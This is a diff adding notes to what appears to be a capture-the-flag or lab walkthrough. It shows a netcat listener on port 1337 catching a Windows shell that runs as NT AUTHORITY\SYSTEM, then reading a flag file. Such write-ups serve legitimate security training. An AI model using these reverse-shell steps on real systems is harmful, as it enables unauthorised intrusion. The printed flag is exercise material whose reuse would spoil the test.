@@ -2238,3 +2238,23 @@ https://www.exploit-db.com/exploits/50834
 ```
 
 
+
+all img
+
+```
+C:\Users\ilfserveradm\Desktop>nc64.exe -lvnp 1337
+listening on [any] 1337 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50122
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+```
+type flag.txt
+33a9d46de4015e7b3b0ad592a9394720
+```
+
